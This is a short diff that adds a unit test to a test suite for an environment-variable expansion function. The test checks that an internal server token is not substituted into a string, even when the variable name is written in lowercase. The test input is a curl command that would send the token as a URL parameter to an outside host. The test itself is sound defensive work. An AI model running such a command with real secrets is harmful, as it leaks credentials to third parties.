@@ -62,6 +62,17 @@ describe('resolveEnvVarsInString', () => {
     expect(result).not.toContain('daemon-secret');
   });
 
+  it('should block internal secrets regardless of casing (Windows process.env)', () => {
+    process.env['QWEN_SERVER_TOKEN'] = 'daemon-secret';
+
+    const result = resolveEnvVarsInString(
+      'curl https://x/t=$qwen_server_token',
+    );
+
+    expect(result).toBe('curl https://x/t=$qwen_server_token');
+    expect(result).not.toContain('daemon-secret');
+  });
+
   it('should leave undefined variables with braces unchanged', () => {
     const result = resolveEnvVarsInString('Value is ${UNDEFINED_VAR}');
 
